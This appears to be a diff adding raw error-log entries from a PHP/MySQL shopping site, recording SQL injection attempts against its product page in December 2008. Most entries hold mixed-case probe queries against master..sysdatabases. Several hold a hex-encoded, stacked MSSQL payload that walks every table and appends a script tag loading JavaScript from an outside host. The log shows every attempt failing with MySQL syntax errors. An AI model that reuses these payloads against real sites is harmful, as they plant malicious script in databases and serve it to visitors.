+filename: /product/product_view.php?p_idx=11%25'%20;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--%20aNd%20'%25'='
+update tblProduct set p_view = p_view + 1 where p_idx = 11%\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- aNd \'%\'=\'
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0
+
+select count(*) from tblRankProduct where 1
+and p_idx = 11 AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 and rp_rank > 0 and rp_rank <= 10
+and date_sub(rp_end_dt, INTERVAL 6 DAY) = rp_start_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 and rp_rank > 0 and rp_r' at line 2
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0
+
+select A.*, B.p_e_idx, B.end_dt, C.shop_name, C.shop_medal, C.shop_url,
+ifnull((select rp_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_rank,
+ifnull((select rp_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_last_rank,
+ifnull((select rp_total_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_rank,
+ifnull((select rp_total_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_last_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rpc_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as best_codi_cnt,
+ifnull((select sum(p_u_val) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val > 0),0) as up_cnt,
+ifnull((select abs(sum(p_u_val)) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val < 0),0) as down_cnt,
+ifnull((select count(*) from tblProductComment where p_idx=A.p_idx and p_c_reg_dt between B.start_dt and B.end_dt ),0) as comment_cnt
+from tblProduct A, tblProductEach B, tblShop C
+where 1
+and A.p_idx = B.p_idx and A.shop_idx = C.shop_idx
+and A.p_idx = 11 AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0
+and now() between B.star' at line 14
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0
+select A.*, B.shop_name, B.shop_medal, B.shop_url from tblProduct A, tblShop B where A.shop_idx = B.shop_idx and A.p_idx = 11 AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0
+
+select A.p_idx, B.p_e_idx, A.p_main_img
+from tblProduct A, tblProductEach B
+where 1 
+and A.p_idx = B.p_idx
+and A.p_idx != 11 AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0
+and A.shop_idx = 
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0
+and A.shop_idx = 
+and no' at line 5
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0
+update tblProduct set p_view = p_view + 1 where p_idx = 11 AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20AnD%20''='
+
+select count(*) from tblRankProduct where 1
+and p_idx = 11\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 AnD \'\'=\' and rp_rank > 0 and rp_rank <= 10
+and date_sub(rp_end_dt, INTERVAL 6 DAY) = rp_start_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 2
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20AnD%20''='
+
+select A.*, B.p_e_idx, B.end_dt, C.shop_name, C.shop_medal, C.shop_url,
+ifnull((select rp_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_rank,
+ifnull((select rp_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_last_rank,
+ifnull((select rp_total_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_rank,
+ifnull((select rp_total_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_last_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rpc_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as best_codi_cnt,
+ifnull((select sum(p_u_val) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val > 0),0) as up_cnt,
+ifnull((select abs(sum(p_u_val)) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val < 0),0) as down_cnt,
+ifnull((select count(*) from tblProductComment where p_idx=A.p_idx and p_c_reg_dt between B.start_dt and B.end_dt ),0) as comment_cnt
+from tblProduct A, tblProductEach B, tblShop C
+where 1
+and A.p_idx = B.p_idx and A.shop_idx = C.shop_idx
+and A.p_idx = 11\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 AnD \'\'=\'
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 14
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20AnD%20''='
+select A.*, B.shop_name, B.shop_medal, B.shop_url from tblProduct A, tblShop B where A.shop_idx = B.shop_idx and A.p_idx = 11\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 AnD \'\'=\'
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20AnD%20''='
+
+select A.p_idx, B.p_e_idx, A.p_main_img
+from tblProduct A, tblProductEach B
+where 1 
+and A.p_idx = B.p_idx
+and A.p_idx != 11\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 AnD \'\'=\'
+and A.shop_idx = 
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 5
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20AnD%20''='
+update tblProduct set p_view = p_view + 1 where p_idx = 11\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 AnD \'\'=\'
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20And%20'%25'='
+
+select count(*) from tblRankProduct where 1
+and p_idx = 11%\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 And \'%\'=\' and rp_rank > 0 and rp_rank <= 10
+and date_sub(rp_end_dt, INTERVAL 6 DAY) = rp_start_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 2
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20And%20'%25'='
+
+select A.*, B.p_e_idx, B.end_dt, C.shop_name, C.shop_medal, C.shop_url,
+ifnull((select rp_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_rank,
+ifnull((select rp_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_last_rank,
+ifnull((select rp_total_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_rank,
+ifnull((select rp_total_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_last_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rpc_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as best_codi_cnt,
+ifnull((select sum(p_u_val) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val > 0),0) as up_cnt,
+ifnull((select abs(sum(p_u_val)) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val < 0),0) as down_cnt,
+ifnull((select count(*) from tblProductComment where p_idx=A.p_idx and p_c_reg_dt between B.start_dt and B.end_dt ),0) as comment_cnt
+from tblProduct A, tblProductEach B, tblShop C
+where 1
+and A.p_idx = B.p_idx and A.shop_idx = C.shop_idx
+and A.p_idx = 11%\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 And \'%\'=\'
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 14
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20And%20'%25'='
+select A.*, B.shop_name, B.shop_medal, B.shop_url from tblProduct A, tblShop B where A.shop_idx = B.shop_idx and A.p_idx = 11%\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 And \'%\'=\'
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20And%20'%25'='
+
+select A.p_idx, B.p_e_idx, A.p_main_img
+from tblProduct A, tblProductEach B
+where 1 
+and A.p_idx = B.p_idx
+and A.p_idx != 11%\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 And \'%\'=\'
+and A.shop_idx = 
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 5
+===========================================================================================
+
+=== [2008/12/25 15:23:30] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20AnD%20(sElEcT%20ChAr(94)%2BcAsT(CoUnT(1)%20aS%20VaRcHaR(100))%2bChAr(94)%20fRoM%20[mAsTeR]..[sYsDaTaBaSeS])>0%20And%20'%25'='
+update tblProduct set p_view = p_view + 1 where p_idx = 11%\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[sYsDaTaBaSeS])>0 And \'%\'=\'
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AnD (sElEcT ChAr(94)+cAsT(CoUnT(1) aS VaRcHaR(100))+ChAr(94) fRoM [mAsTeR]..[' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+
+select count(*) from tblRankProduct where 1
+and p_idx = 11;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- and rp_rank > 0 and rp_rank <= 10
+and date_sub(rp_end_dt, INTERVAL 6 DAY) = rp_start_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522832' at line 2
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+
+select A.*, B.p_e_idx, B.end_dt, C.shop_name, C.shop_medal, C.shop_url,
+ifnull((select rp_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_rank,
+ifnull((select rp_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_last_rank,
+ifnull((select rp_total_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_rank,
+ifnull((select rp_total_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_last_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rpc_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as best_codi_cnt,
+ifnull((select sum(p_u_val) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val > 0),0) as up_cnt,
+ifnull((select abs(sum(p_u_val)) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val < 0),0) as down_cnt,
+ifnull((select count(*) from tblProductComment where p_idx=A.p_idx and p_c_reg_dt between B.start_dt and B.end_dt ),0) as comment_cnt
+from tblProduct A, tblProductEach B, tblShop C
+where 1
+and A.p_idx = B.p_idx and A.shop_idx = C.shop_idx
+and A.p_idx = 11;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522832' at line 14
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+select A.*, B.shop_name, B.shop_medal, B.shop_url from tblProduct A, tblShop B where A.shop_idx = B.shop_idx and A.p_idx = 11;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+------------------------------------------------------------------------------------------
